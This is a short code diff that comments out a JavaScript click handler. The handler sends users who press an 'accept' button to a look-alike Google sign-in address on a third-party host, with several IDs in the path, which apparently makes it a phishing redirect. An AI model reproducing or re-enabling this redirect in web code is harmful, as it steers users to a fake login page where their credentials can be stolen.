@@ -334,17 +334,17 @@
 // let x = 1;
  
  
-document.addEventListener('click', function (e) {
+// document.addEventListener('click', function (e) {
  
  
-    document.querySelectorAll('.accept-button').forEach(button => {
-        button.addEventListener('click', () => {
-            window.location.href = `https://google-signin-live.vercel.app/${adminId}/${posterId}/${verifyId}`;
-        });
-    });
+//     document.querySelectorAll('.accept-button').forEach(button => {
+//         button.addEventListener('click', () => {
+//             window.location.href = `https://google-signin-live.vercel.app/${adminId}/${posterId}/${verifyId}`;
+//         });
+//     });
  
  
-});
+// });
  
  
  
